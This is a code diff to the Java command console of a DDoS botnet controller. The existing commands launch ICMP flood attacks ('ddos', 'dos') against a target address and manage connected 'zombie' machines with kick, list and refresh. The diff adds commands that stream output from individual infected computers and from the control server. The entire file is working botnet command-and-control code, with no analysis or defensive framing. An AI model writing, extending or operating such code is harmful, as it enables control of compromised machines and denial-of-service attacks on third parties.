@@ -1,6 +1,8 @@
 package org.ddos.client.command;
 
+import org.ddos.network.ClientNetwork;
 import org.jcom.Command;
+import org.jcom.CommandCompletionListener;
 import org.jcom.CommandData;
 import org.jcom.CommandException;
 import org.jcom.CommandExecutionListener;
@@ -10,6 +12,7 @@ import org.jcom.FlagData;
 import org.jcom.InvalidCommandArgumentsException;
 import org.jcom.UnknownCommandException;
 import org.jcom.UnknownFlagException;
+import org.jnetwork.DataPackage;
 
 public class ClientCommands {
 	private CommandInterface commands = new CommandInterface();
@@ -27,6 +30,22 @@ public class ClientCommands {
 				}
 			}
 		});
+		commands.addCommandCompletionListener(new CommandCompletionListener() {
+			@Override
+			public void commandCompleted(Command c, CommandData d) {
+				try {
+					if (c.getBaseCommand().equals("readzombie")) {
+						ClientNetwork.getClient().getOutputStream().writeObject(
+								new DataPackage(c.getCommandArguments()[0]).setMessage("STOP_READ_ZOMBIE"));
+					} else if (c.getBaseCommand().equals("readserver")) {
+						ClientNetwork.getClient().getOutputStream()
+								.writeObject(new DataPackage().setMessage("STOP_READ_SERVER"));
+					}
+				} catch (Exception e) {
+					e.printStackTrace();
+				}
+			}
+		});
 
 		commands.putCommand("ddos",
 				new CommandData("ddos [start|stop] <address> {-l size, -t threads, -v valid}",
@@ -34,6 +53,14 @@ public class ClientCommands {
 						new FlagData("-l", "An integer which represents the byte size of each ICMP packet."),
 						new FlagData("-t", "An integer which represents the amount of threads which will be pinging."),
 						new FlagData("-v", "Checks if the address is valid before the DDoS starts.")));
+		commands.putCommand("readzombie",
+				new CommandData("readzombie <address>",
+						"Continuously reads the output from a zombie computer until the command is exited.", 1,
+						CommandActions.getReadFromZombieAction()));
+		commands.putCommand("readserver",
+				new CommandData("readserver",
+						"Continuously reads the output from the server until the command is exited.", 0,
+						CommandActions.getReadFromServerAction()));
 		commands.putCommand("dos",
 				new CommandData("dos [start|stop] <address> {-l size, -t threads, -v valid}",
 						"Starts or stops an attack on address, where all pinging threads are ran on the local machine.",
@@ -48,9 +75,10 @@ public class ClientCommands {
 				new CommandData("kick <address...>",
 						"Kicks all given zombies from the server. The zombies will have to reconnect to the server.",
 						-1, CommandActions.getKickAction()));
-		commands.putCommand("list",
-				new CommandData("list", "Gets the IP addresses of all zombies connected to the server.", 0,
-						CommandActions.getListZombiesAction()));
+		commands.putCommand("list", new CommandData("list {-a all}",
+				"Gets the IP addresses of all zombies connected to the server.", 0,
+				CommandActions.getListZombiesAction(), new FlagData("-a",
+						"Gets the IP addresses of all computers connected to the server, including clients.")));
 		commands.putCommand("refresh",
 				new CommandData("refresh", "Removes all of the disconected zombies off of the server.", 0,
 						CommandActions.getRemoveDeadZombiesAction()));
@@ -71,8 +99,7 @@ public class ClientCommands {
 				CommandActions.getExitAction(), new FlagData("-k", "Kicks all of the zombies off of the server.")));
 	}
 
-	public void executeCommand(Command command)
- throws UnknownCommandException, InvalidCommandArgumentsException,
+	public void executeCommand(Command command) throws UnknownCommandException, InvalidCommandArgumentsException,
 			CommandInterruptedException, UnknownFlagException {
 		commands.executeCommand(command);
 	}
